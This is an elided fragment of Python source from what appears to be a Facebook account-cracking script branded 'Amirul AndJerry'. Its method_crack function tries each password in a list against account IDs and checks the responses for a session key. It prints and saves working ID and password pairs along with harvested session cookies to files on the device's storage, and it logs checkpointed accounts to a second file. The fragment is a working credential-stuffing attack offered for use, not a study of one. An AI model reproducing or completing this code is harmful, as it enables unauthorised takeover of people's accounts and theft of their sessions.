...
def method_crack(ids,passlist):
    ...
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[%s|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[𝐀𝐦𝐢𝐫𝐮𝐥 𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/𝐀𝐦𝐢𝐫𝐮𝐥-*𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[𝐀𝐦𝐢𝐫𝐮𝐥 𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/𝐀𝐦𝐢𝐫𝐮𝐥. 𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
